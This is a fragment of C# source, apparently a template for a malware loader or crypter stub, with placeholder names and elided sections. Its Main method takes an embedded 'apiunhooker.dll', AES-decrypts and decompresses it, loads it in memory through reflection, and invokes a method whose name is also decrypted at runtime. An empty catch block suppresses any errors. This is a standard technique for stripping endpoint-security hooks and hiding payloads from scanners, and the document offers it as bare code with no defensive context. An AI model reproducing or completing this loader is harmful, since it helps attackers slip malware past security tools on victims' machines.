...
namespace namespace_name
{
    internal class class_name
    {
        ...
        static void Main(string[] args)
        {
            ...
            string unhookstr = @"apiunhooker.dll";
            
            Assembly asm = Assembly.GetExecutingAssembly();
            try
            {
                byte[] unhookerBytes = getembeddedresourcefunction_name(unhookstr);
                byte[] unhookerDecrypted = aesfunction_name(unhookerBytes, Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"));
                byte[] unhookerDecompressed = uncompressfunction_name(unhookerDecrypted);

                Assembly unhookerAsm = Assembly.Load(unhookerDecompressed);
                ...
                string unhookerMethod = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerfunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));

                unhookerAsm.GetType(unhookerClass)?.GetMethod(unhookerMethod)?.Invoke(null, null);
            }
            catch
            {
            }
